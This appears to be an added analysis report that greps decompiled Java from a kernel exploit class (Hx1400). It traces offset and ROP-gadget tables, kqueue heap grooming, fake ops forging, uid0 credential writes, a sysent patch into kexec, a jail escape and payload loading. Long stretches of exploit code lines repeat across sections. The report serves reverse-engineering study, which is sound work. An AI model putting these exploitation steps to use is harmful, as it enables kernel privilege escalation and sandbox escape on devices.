@@ -1,0 +1,380 @@
+======================================================================
+  tableFault() / tableApply() — WHERE DOES P[] COME FROM?
+======================================================================
+
+    static String tableFault() {
+        if (P == null || P.length != 31) {
+            return "P missing or wrong length";
+        }
+        if (PG == null || PGL == null || PGN == null || PGW == null) {
+            return "a patch table is missing";
+        }
+        if (PG.length != PGL.length || PG.length != PGN.length || PG.length != PGW.length) {
+            return "the patch tables disagree in length";
+        }
+        if (PKB == null || PKB.length() < 64 || (PKB.length() & 1) != 0) {
+            return "the payload is missing";
+        }
+        return null;
+    }
+
+    static void tableApply() {
+        SE11 = P[0];
+        KEXECG = P[1];
+        HEN_SIZE = (int)P[2];
+        HEN_ENTRY = (int)P[3];
+        OFF_FIXES = (int)P[4];
+        OFF_MMAP = (int)P[5];
+        OFF_BLOCKUPD = (int)P[6];
+        OFF_ASLR = (int)P[7];
+        OFF_NOBD = (int)P[8];
+        OFF_SKIP = (int)P[9];
+        CFG_UPLOAD = (int)P[10];
+        CFG_PLUGINS = (int)P[11];
+        ANCHOR = P[12];
+        R_SLOT = P[13];
+        R_OPS = P[14];
+        R_RET0 = P[15];
+        R_TOUCH = P[16];
+        R_POPRSP = P[17];
+        R_SAVE = P[18];
+        R_REST = P[19];
+        R_CONT = P[20];
+        R_PRAX = P[21];
+        R_PRDX = P[22];
+        R_PRDI = P[23];
+        R_UCRED = P[24];
+        R_RAXRCX = P[25];
+        R_LDRAX = P[26];
+        R_ADDRAX = P[27];
+        R_STRAXRDX = P[28];
+        R_STRDIRAX = P[29];
+        R_UIDPAIR = P[30];
+        GRVA = PG;
+        GLEN = PGL;
+        GNOW = PGN;
+        GNEW = PGW;
+        BLOB1400 = PKB;
+    }
+
+======================================================================
+  Every P[n] read (P[0..14] = kernel offsets, P[15..30] = gadgets)
+======================================================================
+  205  SE11 = P[0];
+  206  KEXECG = P[1];
+  207  HEN_SIZE = (int)P[2];
+  208  HEN_ENTRY = (int)P[3];
+  209  OFF_FIXES = (int)P[4];
+  210  OFF_MMAP = (int)P[5];
+  211  OFF_BLOCKUPD = (int)P[6];
+  212  OFF_ASLR = (int)P[7];
+  213  OFF_NOBD = (int)P[8];
+  214  OFF_SKIP = (int)P[9];
+  215  CFG_UPLOAD = (int)P[10];
+  216  CFG_PLUGINS = (int)P[11];
+  217  ANCHOR = P[12];
+  218  R_SLOT = P[13];
+  219  R_OPS = P[14];
+  220  R_RET0 = P[15];
+  221  R_TOUCH = P[16];
+  222  R_POPRSP = P[17];
+  223  R_SAVE = P[18];
+  224  R_REST = P[19];
+  225  R_CONT = P[20];
+  226  R_PRAX = P[21];
+  227  R_PRDX = P[22];
+  228  R_PRDI = P[23];
+  229  R_UCRED = P[24];
+  230  R_RAXRCX = P[25];
+  231  R_LDRAX = P[26];
+  232  R_ADDRAX = P[27];
+  233  R_STRAXRDX = P[28];
+  234  R_STRDIRAX = P[29];
+  235  R_UIDPAIR = P[30];
+
+======================================================================
+  Where is P (or PG/PGL/PGN/PGW/PKB) assigned or loaded?
+======================================================================
+   14  public static volatile long[] P = null;
+   15  public static volatile long[] PG = null;
+   16  public static volatile int[] PGL = null;
+   17  public static volatile int[] PGN = null;
+   18  public static volatile int[] PGW = null;
+   19  public static volatile String PKB = null;
+  188  static String tableFault() {
+  189  if (P == null || P.length != 31) {
+  192  if (PG == null || PGL == null || PGN == null || PGW == null) {
+  198  if (PKB == null || PKB.length() < 64 || (PKB.length() & 1) != 0) {
+  204  static void tableApply() {
+  293  String string = Hx1400.tableFault();
+  298  Hx1400.tableApply();
+
+======================================================================
+  '1400.bin' references — size, source, load path
+======================================================================
+   11  public class Hx1400
+   56  static String BLOB1400;
+  240  BLOB1400 = PKB;
+  293  String string = Hx1400.tableFault();
+  298  Hx1400.tableApply();
+  352  Object obj = constructor.newInstance(Class.forName("Hx1400"), "x", new Boolean(true));
+  626  if (Hx1400.sx(this.ac(unsafe, l47, i, 0L, 13L, l80, 8L, 0L)) == 0L) {
+  628  if (Hx1400.sx(this.ac(unsafe, l44, i, 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+  633  if (Hx1400.sx(this.ac(unsafe, l48, i, 41L, 51L, l82, l83, 0L)) != 0L || unsafe.getInt(l83) != 248 || Hx1400.sx(this.ac(unsafe, l44, i, 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+  637  long l84 = Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L));
+  647  if (Hx1400.sx(this.ac(unsafe, l49, l12, 6L, 0L, l64, 0L, 0L)) != 0L) {
+  650  long l86 = Hx1400.sx(this.ac(unsafe, l53, 3L, 1L, l85, 16L, l71, 0L));
+  682  this.lg(unsafe, "A KBASE=" + (this.kbase != 0L ? Hx1400.h16(this.kbase) : "none") + " washStuck=" + this.wStuck);
+  692  int n26 = (int)Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L));
+  696  for (int i = 0; i < 96 && (l11 = Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L))) > l87; ++i) {
+  708  long l89 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
+  714  if (Hx1400.sx(this.ac(unsafe, l59, l89, l88, 0L, 0L, 0L, 0L)) == 0L) {
+  720  this.lg(unsafe, "B1 our dce fd=" + l89 + " dev=" + Hx1400.hz(l92) + " ino=" + Hx1400.hz(l91) + " rdev=" + Hx1400.hz(l90));
+  732  if (Hx1400.sx(this.ac(unsafe, l59, i, l88, 0L, 0L, 0L, 0L)) != 0L) continue;
+  755  if (Hx1400.sx(this.ac(unsafe, l44, nArray5[n15], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+  764  long l97 = Hx1400.sx(this.ac(unsafe, l43, l10, 2L, 0L, 0L, 0L, 0L));
+  772  l10 = Hx1400.sx(this.ac(unsafe, l43, l96, 2L, 0L, 0L, 0L, 0L));
+  782  long l98 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
+  783  long l99 = l98 >= 0L ? Hx1400.sx(this.ac(unsafe, l44, l98, 0L, 0L, 0L, 0L, 0L)) : -1L;
+  789  for (n13 = 0; n13 < 144 && (l9 = Hx1400.sx(this.ac(unsafe, l46, 28L, 2L, 0L, 0L, 0L, 0L))) > l100; ++n13) {
+  802  this.cKq = l8 = Hx1400.sx(this.ac(unsafe, l51, 0L, 0L, 0L, 0L, 0L, 0L));
+  825  if (n38 >= n30 || !this.marked(unsafe, l48, nArray7[n38], l75, l76) || Hx1400.sx(this.ac(unsafe, l47, nArray7[n38], 41L, 51L, 0L, 0L, 0L)) != 0L) continue;
+  826  long l103 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
+  838  long l105 = Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L));
+  846  if (Hx1400.sx(this.ac(unsafe, l48, nArray7[i], 41L, 51L, l75, l76, 0L)) != 0L) continue;
+  863  if (Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L)) != 0L) {
+  874  this.lg(unsafe, "C HELD round=" + n12 + " try=" + n35 + " cand=" + n38 + " dce=" + l103 + " target=" + n32 + " val=" + Hx1400.hz(l104));
+  897  return this.fin(unsafe, "no pair after " + n35 + " arms (cap " + 32 + "), " + n36 + " blind writes left in the kernel, kbase=" + Hx1400.h16(this.kbase));
+  902  this.lg(unsafe, "D fake=" + Hx1400.hz(l106) + " page=" + Hx1400.hz(l107) + " mmap=" + Hx1400.hz(l108));
+  904  return this.fin(unsafe, "mmap fixed " + Hx1400.hz(l108));
+  909  if (Hx1400.sx(this.ac(unsafe, l47, n26, 0L, 12L, l79, 8L, 0L)) != 0L || Hx1400.sx(this.ac(unsafe, l47, n26, 0L, 12L, l80, 8L, 0L)) != 0L) {
+  912  if (Hx1400.sx(this.ac(unsafe, l47, n33, 41L, 51L, 0L, 0L, 0L)) != 0L) {
+  916  for (n10 = 0; n10 < n27 && Hx1400.sx(this.ac(unsafe, l47, nArray4[n10], 0L, 12L, l79, 8L, 0L)) == 0L && Hx1400.sx(this.ac(unsafe, l47, nArray4[n10], 0L, 12L, l80, 8L, 0L)) == 0L; ++n10) {
+  948  this.lg(unsafe, "D \u26d4 armed from here: " + Hx1400.hz(l106) + " is about to enter a membership vector");
+  949  this.lg(unsafe, "D arming filter -18 data=0 -> plants " + Hx1400.hz(l106) + " in the membership vector");
+  950  if (Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L)) != 0L) {
+  962  if (Hx1400.kptr(l110)) {
+  968  this.lg(unsafe, "D noncanonical tree at " + n11 + " = " + Hx1400.h16(l110));
+  971  this.lg(unsafe, "D victim=" + n10 + " KVA=" + (l109 != 0L ? Hx1400.h16(l109) : "none") + " count=" + unsafe.getLong(l106 + 88L));
+  972  if (n10 < 0 || !Hx1400.kptr(l109)) {
+  989  long l115 = Hx1400.sx(this.ac(unsafe, l47, n11, 0L, 72L, l81, 12L, 0L));
+  990  boolean bl6 = l115 == 0L && unsafe.getLong(l114) == l111 && unsafe.getLong(l106 + 80L) == l112 && Hx1400.kptr(unsafe.getLong(l112));
+  991  this.lg(unsafe, "E gadget rc=" + l115 + " T=" + Hx1400.h16(unsafe.getLong(l114)) + " want=" + Hx1400.h16(l111) + " root=" + Hx1400.h16(unsafe.getLong(l106 + 80L)) + " ok=" + bl6);
+ 1010  this.lg(unsafe, "F rotating fake ops into slot " + Hx1400.h16(l116));
+ 1011  long l119 = Hx1400.sx(this.ac(unsafe, l47, n11, 0L, 72L, l81, 12L, 0L));
+ 1012  boolean bl7 = l119 == 0L && unsafe.getLong(l106 + 80L) == l111 && unsafe.getLong(l106 + 88L) == 4L && unsafe.getLong(l111) == 0L && unsafe.getLong(l111 + 8L) == l113 && unsafe.getLong(l111 + 16L) == l112 && unsafe.getLong(l112 + 8L) == l111 && unsafe.getLong(l113 + 16L) == 0L && Hx1400.kptr(unsafe.getLong(l112));
+ 1013  this.lg(unsafe, "F rotate rc=" + l119 + " root=" + Hx1400.h16(unsafe.getLong(l106 + 80L)) + " Gparent=" + Hx1400.h16(unsafe.getLong(l111 + 16L)) + " ok=" + bl7);
+ 1025  this.lg(unsafe, "F fakeOps isfd=0 attach=" + Hx1400.h16(unsafe.getLong(l112 + 8L)) + " touch=" + Hx1400.h16(unsafe.getLong(l112 + 32L)));
+ 1039  if ((l6 = Hx1400.sx(this.ac(unsafe, l51, 0L, 0L, 0L, 0L, 0L, 0L))) < 0L) {
+ 1046  if (Hx1400.sx(this.ac(unsafe, l52, l6, l77, 1L, 0L, 0L, 0L)) != 0L) {
+ 1073  this.lg(unsafe, "F entry1 uid0 = " + n41 + " qwords at " + Hx1400.hz(l120) + " ctx=" + Hx1400.hz(l121));
+ 1075  long l123 = l122 != 0L ? Hx1400.sx(this.ac(unsafe, l122, 0L, 0L, 0L, 0L, 0L, 0L)) : -1L;
+ 1109  this.lg(unsafe, n8 != 0 ? "H *** kernel is ALREADY FULLY PATCHED - skipping 1400.bin ***" : "H *** kernel is stock - 1400.bin will be applied ***");
+ 1114  this.lg(unsafe, "H sysent[11].sy_call before=" + Hx1400.h16(l126) + " (unpatched kernel: sys_nosys)");
+ 1121  l5 = Hx1400.sx(this.ac(unsafe, l60, 0L, 16384L, 7L, 0L, 0L, 0L));
+ 1129  this.lg(unsafe, "I fixed map refused, floating map=" + Hx1400.hz(l4));
+ 1135  n48 = Hx1400.hexv(BLOB1400.charAt(n7 * 2));
+ 1136  n47 = Hx1400.hexv(BLOB1400.charAt(n7 * 2 + 1));
+ 1142  this.lg(unsafe, "I blob at " + Hx1400.hz(l4) + " head=" + Integer.toHexString(n7) + " " + Integer.toHexString(n48) + " tail=" + Integer.toHexString(n47) + " (want b9 82 ... c3)");
+ 1150  this.lg(unsafe, "J f_touch=" + Hx1400.h16(l4) + " - firing EV_ADD -23 once");
+ 1155  long l127 = Hx1400.sx(this.ac(unsafe, l52, l6, l77, 1L, 0L, 0L, 0L));
+ 1161  this.lg(unsafe, "K sysent[11].sy_call=" + Hx1400.h16(l125) + " want=" + Hx1400.h16(l128) + "  APPLIED=" + bl10);
+ 1174  this.lg(unsafe, bl9 ? "K *** 1400.bin APPLIED - syscall 11 IS NOW kexec ***" : "K NOT fully applied");
+ 1180  this.lg(unsafe, "K already patched: sysent[11].sy_call=" + Hx1400.h16(l5) + " want=" + Hx1400.h16(this.ka(KEXECG)) + " kexec live=" + bl9);
+ 1185  this.lg(unsafe, "L console-sink byte @" + Hx1400.h16(l5) + " = " + Hx1400.h16(l4) + " sig=" + (n7 != 0) + " (want ..ff ff ff ff ff 20)");
+ 1189  this.lg(unsafe, "L set to 0x" + Integer.toHexString(0) + " -> " + Hx1400.h16(l130) + " ok=" + bl11);
+ 1201  if (Hx1400.kptr(l133) && Hx1400.kptr(l134)) {
+ 1203  for (int i = 0; Hx1400.kptr(l137) && i < 64; ++i) {
+ 1214  if (Hx1400.kptr(l136) && Hx1400.kptr(l134)) {
+ 1220  this.lg(unsafe, "M proc=" + Hx1400.h16(l135) + " pfd=" + Hx1400.h16(l136) + " rootvn=" + Hx1400.h16(l134) + " escaped=" + (n50 != 0));
+ 1224  long l139 = Hx1400.sx(this.ac(unsafe, l14, l138, 511L, 0L, 0L, 0L, 0L));
+ 1225  long l140 = Hx1400.sx(this.ac(unsafe, l43, l3, 1537L, 438L, 0L, 0L, 0L));
+ 1232  l141 = Hx1400.sx(this.ac(unsafe, l42, l140, l2, string2.length(), 0L, 0L, 0L));
+ 1236  l2 = Hx1400.sx(this.ac(unsafe, l43, l3, 0L, 0L, 0L, 0L, 0L));
+ 1241  l142 = Hx1400.sx(this.ac(unsafe, l15, l2, l, 256L, 0L, 0L, 0L));
+ 1261  long l145 = l122 != 0L ? Hx1400.sx(this.ac(unsafe, l122, 0L, 0L, 0L, 0L, 0L, 0L)) : -1L;
+ 1265  if (nArray7[i] <= 0 || Hx1400.sx(this.ac(unsafe, l44, nArray7[i], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+ 1274  long l147 = Hx1400.sx(this.ac(unsafe, l43, l146, 0L, 0L, 0L, 0L, 0L));
+ 1280  long l148 = Hx1400.sx(this.ac(unsafe, l60, 0L, 589824L, 7L, 0L, 0L, 0L));
+ 1292  this.lg(unsafe, "H3 hen map=" + Hx1400.hz(l149) + " span=" + Hx1400.hz(589824L) + " fd=" + l148);
+ 1374  this.lg(unsafe, "H6 pthread_create=" + Hx1400.hz(l151) + " prologue=" + Integer.toHexString(n2));
+ 1384  l153 = Hx1400.sx(this.ac(unsafe, l151, l152, 0L, l149, 0L, 0L, 0L));
+ 1385  this.lg(unsafe, "H7 pthread_create rc=" + l153 + " handle=" + Hx1400.h16(unsafe.getLong(l152)));
+ 1395  if (Hx1400.sx(this.ac(unsafe, l44, nArray4[n], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+ 1401  if (Hx1400.sx(this.ac(unsafe, l44, n26, 0L, 0L, 0L, 0L, 0L)) == 0L) {
+ 1407  if (Hx1400.sx(this.ac(unsafe, l44, l101, 0L, 0L, 0L, 0L, 0L)) == 0L) {
+ 1413  if (Hx1400.sx(this.ac(unsafe, l44, l8, 0L, 0L, 0L, 0L, 0L)) == 0L) {
+ 1420  if (Hx1400.sx(this.ac(unsafe, l44, nArray6[n], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+ 1431  this.lg(unsafe, "H8 kept: hen map " + Hx1400.hz(l149) + " fd " + l148 + ", blob map, fake page " + Hx1400.hz(l107) + " - hen.bin runs from one of them");
+ 1442  this.lg(unsafe, "G kbase=" + Hx1400.h16(this.kbase) + " slot=" + Hx1400.h16(l116) + " ops=" + Hx1400.h16(l117));
+ 1444  stringBuffer8.append("HEN14V pid=").append(this.pid).append(" KBASE=").append(Hx1400.h16(this.kbase));
+ 1447  stringBuffer8.append(" KVA=").append(Hx1400.h16(l109)).append(" victim=").append(n10);
+ 1448  stringBuffer8.append(" bridge=").append(n41).append(" walked=").append(n6).append(" APPLIED=").append(n5 != 0 ? "1" : "0").append(" se11=").append(Hx1400.h16(l143));
+ 1619  this.lg(unsafe, string + "1 fake pinned: ref=0x" + Integer.toHexString(unsafe.getInt(this.cFake + 56L)) + " srcs=" + Hx1400.h16(unsafe.getLong(this.cFake + 80L)) + " nsrc=" + unsafe.getLong(this.cFake + 88L));
+ 1643  long l = Hx1400.sx(this.ac(unsafe, this.cSke, this.cRkq, this.cEvB, 1L, 0L, 0L, 0L));
+ 1644  long l2 = Hx1400.sx(this.ac(unsafe, this.cCl, this.cRkq, 0L, 0L, 0L, 0L, 0L));
+ 1649  boolean bl3 = this.cCs != 0L && this.cMsav != 0L && Hx1400.sx(this.ac(unsafe, this.cCs, 3L, 1L, -1L, 16L, this.cMsav, 0L)) == 0L;
+ 1650  this.lg(unsafe, string + "4 QUARANTINED LIVE on purpose: " + this.cNv + " victims + " + this.cN + " spray + anchor/dce stay open, page " + Hx1400.hz(this.cPage) + " stays mapped ; unpinned=" + bl3);
+ 1737  long l10 = Hx1400.sx(this.ac(unsafe, l, 4097L, l5, 5L, 3L, l6, 0L));
+ 1781  return "op=" + this.wFailOp + " at=" + this.wFailAt + (this.wRc != 0L ? " rc=" + this.wRc : "") + (this.wBad != 0 ? " res=" + Hx1400.hz((long)this.wBad & 0xFFFFFFFFL) : "");
+ 1823  if (Hx1400.sx(this.ac(unsafe, l, n, 41L, 51L, l2, l3, 0L)) != 0L) {
+
+======================================================================
+  Magic constants — what do they actually spell?
+======================================================================
+  mark     5570198814713989681
+    hex:      0x4D4D524F4F544A31
+    LE bytes: 31 4A 54 4F 4F 52 4D 4D
+    LE ascii: '1JTOORMM'
+    BE ascii: 'MMROOTJ1'
+
+  uidpair  5188428245707522067
+    hex:      0x4801000000000013
+    LE bytes: 13 00 00 00 00 00 01 48
+    LE ascii: '.......H'
+    BE ascii: 'H.......'
+
+======================================================================
+  HEN_SIZE constant
+======================================================================
+   11  public class Hx1400
+   56  static String BLOB1400;
+   57  static long[] GRVA;
+   58  static int[] GLEN;
+   63  static final String HEN_URL = "file:/__bonk___offline_missing__/hen.bin";
+   66  static int HEN_SIZE;
+   67  static int HEN_ENTRY;
+   69  static final long HEN_MAP = 0x950000000L;
+   70  static final long HEN_SPAN = 589824L;
+  137  static long R_UCRED;
+  143  static long R_UIDPAIR;
+  207  HEN_SIZE = (int)P[2];
+  208  HEN_ENTRY = (int)P[3];
+  229  R_UCRED = P[24];
+  235  R_UIDPAIR = P[30];
+  236  GRVA = PG;
+  237  GLEN = PGL;
+  240  BLOB1400 = PKB;
+  293  String string = Hx1400.tableFault();
+  298  Hx1400.tableApply();
+  352  Object obj = constructor.newInstance(Class.forName("Hx1400"), "x", new Boolean(true));
+  626  if (Hx1400.sx(this.ac(unsafe, l47, i, 0L, 13L, l80, 8L, 0L)) == 0L) {
+  628  if (Hx1400.sx(this.ac(unsafe, l44, i, 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+  633  if (Hx1400.sx(this.ac(unsafe, l48, i, 41L, 51L, l82, l83, 0L)) != 0L || unsafe.getInt(l83) != 248 || Hx1400.sx(this.ac(unsafe, l44, i, 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+  637  long l84 = Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L));
+  647  if (Hx1400.sx(this.ac(unsafe, l49, l12, 6L, 0L, l64, 0L, 0L)) != 0L) {
+  650  long l86 = Hx1400.sx(this.ac(unsafe, l53, 3L, 1L, l85, 16L, l71, 0L));
+  682  this.lg(unsafe, "A KBASE=" + (this.kbase != 0L ? Hx1400.h16(this.kbase) : "none") + " washStuck=" + this.wStuck);
+  692  int n26 = (int)Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L));
+  696  for (int i = 0; i < 96 && (l11 = Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L))) > l87; ++i) {
+  708  long l89 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
+  714  if (Hx1400.sx(this.ac(unsafe, l59, l89, l88, 0L, 0L, 0L, 0L)) == 0L) {
+  720  this.lg(unsafe, "B1 our dce fd=" + l89 + " dev=" + Hx1400.hz(l92) + " ino=" + Hx1400.hz(l91) + " rdev=" + Hx1400.hz(l90));
+  732  if (Hx1400.sx(this.ac(unsafe, l59, i, l88, 0L, 0L, 0L, 0L)) != 0L) continue;
+  755  if (Hx1400.sx(this.ac(unsafe, l44, nArray5[n15], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+  764  long l97 = Hx1400.sx(this.ac(unsafe, l43, l10, 2L, 0L, 0L, 0L, 0L));
+  772  l10 = Hx1400.sx(this.ac(unsafe, l43, l96, 2L, 0L, 0L, 0L, 0L));
+  782  long l98 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
+  783  long l99 = l98 >= 0L ? Hx1400.sx(this.ac(unsafe, l44, l98, 0L, 0L, 0L, 0L, 0L)) : -1L;
+  789  for (n13 = 0; n13 < 144 && (l9 = Hx1400.sx(this.ac(unsafe, l46, 28L, 2L, 0L, 0L, 0L, 0L))) > l100; ++n13) {
+  802  this.cKq = l8 = Hx1400.sx(this.ac(unsafe, l51, 0L, 0L, 0L, 0L, 0L, 0L));
+  825  if (n38 >= n30 || !this.marked(unsafe, l48, nArray7[n38], l75, l76) || Hx1400.sx(this.ac(unsafe, l47, nArray7[n38], 41L, 51L, 0L, 0L, 0L)) != 0L) continue;
+  826  long l103 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
+  838  long l105 = Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L));
+  846  if (Hx1400.sx(this.ac(unsafe, l48, nArray7[i], 41L, 51L, l75, l76, 0L)) != 0L) continue;
+  863  if (Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L)) != 0L) {
+  874  this.lg(unsafe, "C HELD round=" + n12 + " try=" + n35 + " cand=" + n38 + " dce=" + l103 + " target=" + n32 + " val=" + Hx1400.hz(l104));
+  897  return this.fin(unsafe, "no pair after " + n35 + " arms (cap " + 32 + "), " + n36 + " blind writes left in the kernel, kbase=" + Hx1400.h16(this.kbase));
+  902  this.lg(unsafe, "D fake=" + Hx1400.hz(l106) + " page=" + Hx1400.hz(l107) + " mmap=" + Hx1400.hz(l108));
+  904  return this.fin(unsafe, "mmap fixed " + Hx1400.hz(l108));
+  909  if (Hx1400.sx(this.ac(unsafe, l47, n26, 0L, 12L, l79, 8L, 0L)) != 0L || Hx1400.sx(this.ac(unsafe, l47, n26, 0L, 12L, l80, 8L, 0L)) != 0L) {
+  912  if (Hx1400.sx(this.ac(unsafe, l47, n33, 41L, 51L, 0L, 0L, 0L)) != 0L) {
+  916  for (n10 = 0; n10 < n27 && Hx1400.sx(this.ac(unsafe, l47, nArray4[n10], 0L, 12L, l79, 8L, 0L)) == 0L && Hx1400.sx(this.ac(unsafe, l47, nArray4[n10], 0L, 12L, l80, 8L, 0L)) == 0L; ++n10) {
+  948  this.lg(unsafe, "D \u26d4 armed from here: " + Hx1400.hz(l106) + " is about to enter a membership vector");
+  949  this.lg(unsafe, "D arming filter -18 data=0 -> plants " + Hx1400.hz(l106) + " in the membership vector");
+  950  if (Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L)) != 0L) {
+  962  if (Hx1400.kptr(l110)) {
+  968  this.lg(unsafe, "D noncanonical tree at " + n11 + " = " + Hx1400.h16(l110));
+  971  this.lg(unsafe, "D victim=" + n10 + " KVA=" + (l109 != 0L ? Hx1400.h16(l109) : "none") + " count=" + unsafe.getLong(l106 + 88L));
+  972  if (n10 < 0 || !Hx1400.kptr(l109)) {
+  989  long l115 = Hx1400.sx(this.ac(unsafe, l47, n11, 0L, 72L, l81, 12L, 0L));
+  990  boolean bl6 = l115 == 0L && unsafe.getLong(l114) == l111 && unsafe.getLong(l106 + 80L) == l112 && Hx1400.kptr(unsafe.getLong(l112));
+  991  this.lg(unsafe, "E gadget rc=" + l115 + " T=" + Hx1400.h16(unsafe.getLong(l114)) + " want=" + Hx1400.h16(l111) + " root=" + Hx1400.h16(unsafe.getLong(l106 + 80L)) + " ok=" + bl6);
+ 1010  this.lg(unsafe, "F rotating fake ops into slot " + Hx1400.h16(l116));
+ 1011  long l119 = Hx1400.sx(this.ac(unsafe, l47, n11, 0L, 72L, l81, 12L, 0L));
+ 1012  boolean bl7 = l119 == 0L && unsafe.getLong(l106 + 80L) == l111 && unsafe.getLong(l106 + 88L) == 4L && unsafe.getLong(l111) == 0L && unsafe.getLong(l111 + 8L) == l113 && unsafe.getLong(l111 + 16L) == l112 && unsafe.getLong(l112 + 8L) == l111 && unsafe.getLong(l113 + 16L) == 0L && Hx1400.kptr(unsafe.getLong(l112));
+ 1013  this.lg(unsafe, "F rotate rc=" + l119 + " root=" + Hx1400.h16(unsafe.getLong(l106 + 80L)) + " Gparent=" + Hx1400.h16(unsafe.getLong(l111 + 16L)) + " ok=" + bl7);
+ 1025  this.lg(unsafe, "F fakeOps isfd=0 attach=" + Hx1400.h16(unsafe.getLong(l112 + 8L)) + " touch=" + Hx1400.h16(unsafe.getLong(l112 + 32L)));
+ 1039  if ((l6 = Hx1400.sx(this.ac(unsafe, l51, 0L, 0L, 0L, 0L, 0L, 0L))) < 0L) {
+ 1046  if (Hx1400.sx(this.ac(unsafe, l52, l6, l77, 1L, 0L, 0L, 0L)) != 0L) {
+ 1061  n41 = this.w8(unsafe, l120, n41, this.ka(R_UCRED));
+ 1067  n41 = this.w8(unsafe, l120, n41, this.ka(R_UIDPAIR));
+ 1073  this.lg(unsafe, "F entry1 uid0 = " + n41 + " qwords at " + Hx1400.hz(l120) + " ctx=" + Hx1400.hz(l121));
+ 1075  long l123 = l122 != 0L ? Hx1400.sx(this.ac(unsafe, l122, 0L, 0L, 0L, 0L, 0L, 0L)) : -1L;
+ 1085  for (n9 = 0; n9 < GRVA.length; ++n9) {
+ 1086  n8 = (int)this.kbytes(unsafe, l52, l77, l6, this.ka(GRVA[n9]), GLEN[n9]);
+ 1095  stringBuffer3.append(" +").append(Long.toHexString(GRVA[n9])).append("=").append(Integer.toHexString(n8));
+ 1100  this.lg(unsafe, "H guards: stock=" + n42 + " patched=" + n43 + " odd=" + (GRVA.length - n42 - n43) + " of " + GRVA.length);
+ 1104  n9 = n42 == GRVA.length ? 1 : 0;
+ 1105  int n45 = n8 = n43 == GRVA.length ? 1 : 0;
+ 1107  return this.fin(unsafe, "MIXED kernel: stock=" + n42 + " patched=" + n43 + " first odd +0x" + Long.toHexString(GRVA[n44 < 0 ? 0 : n44]) + "=0x" + Long.toHexString(l124) + " - refusing to fire, cold reboot first");
+ 1109  this.lg(unsafe, n8 != 0 ? "H *** kernel is ALREADY FULLY PATCHED - skipping 1400.bin ***" : "H *** kernel is stock - 1400.bin will be applied ***");
+ 1114  this.lg(unsafe, "H sysent[11].sy_call before=" + Hx1400.h16(l126) + " (unpatched kernel: sys_nosys)");
+ 1121  l5 = Hx1400.sx(this.ac(unsafe, l60, 0L, 16384L, 7L, 0L, 0L, 0L));
+ 1129  this.lg(unsafe, "I fixed map refused, floating map=" + Hx1400.hz(l4));
+ 1135  n48 = Hx1400.hexv(BLOB1400.charAt(n7 * 2));
+ 1136  n47 = Hx1400.hexv(BLOB1400.charAt(n7 * 2 + 1));
+ 1142  this.lg(unsafe, "I blob at " + Hx1400.hz(l4) + " head=" + Integer.toHexString(n7) + " " + Integer.toHexString(n48) + " tail=" + Integer.toHexString(n47) + " (want b9 82 ... c3)");
+ 1150  this.lg(unsafe, "J f_touch=" + Hx1400.h16(l4) + " - firing EV_ADD -23 once");
+ 1155  long l127 = Hx1400.sx(this.ac(unsafe, l52, l6, l77, 1L, 0L, 0L, 0L));
+ 1161  this.lg(unsafe, "K sysent[11].sy_call=" + Hx1400.h16(l125) + " want=" + Hx1400.h16(l128) + "  APPLIED=" + bl10);
+ 1164  int n49 = (int)this.kbytes(unsafe, l52, l77, l6, this.ka(GRVA[i]), GLEN[i]);
+ 1165  stringBuffer4.append(" +").append(Long.toHexString(GRVA[i])).append("=").append(Integer.toHexString(n49));
+ 1174  this.lg(unsafe, bl9 ? "K *** 1400.bin APPLIED - syscall 11 IS NOW kexec ***" : "K NOT fully applied");
+ 1180  this.lg(unsafe, "K already patched: sysent[11].sy_call=" + Hx1400.h16(l5) + " want=" + Hx1400.h16(this.ka(KEXECG)) + " kexec live=" + bl9);
+ 1185  this.lg(unsafe, "L console-sink byte @" + Hx1400.h16(l5) + " = " + Hx1400.h16(l4) + " sig=" + (n7 != 0) + " (want ..ff ff ff ff ff 20)");
+ 1189  this.lg(unsafe, "L set to 0x" + Integer.toHexString(0) + " -> " + Hx1400.h16(l130) + " ok=" + bl11);
+ 1201  if (Hx1400.kptr(l133) && Hx1400.kptr(l134)) {
+ 1203  for (int i = 0; Hx1400.kptr(l137) && i < 64; ++i) {
+ 1214  if (Hx1400.kptr(l136) && Hx1400.kptr(l134)) {
+ 1220  this.lg(unsafe, "M proc=" + Hx1400.h16(l135) + " pfd=" + Hx1400.h16(l136) + " rootvn=" + Hx1400.h16(l134) + " escaped=" + (n50 != 0));
+ 1224  long l139 = Hx1400.sx(this.ac(unsafe, l14, l138, 511L, 0L, 0L, 0L, 0L));
+ 1225  long l140 = Hx1400.sx(this.ac(unsafe, l43, l3, 1537L, 438L, 0L, 0L, 0L));
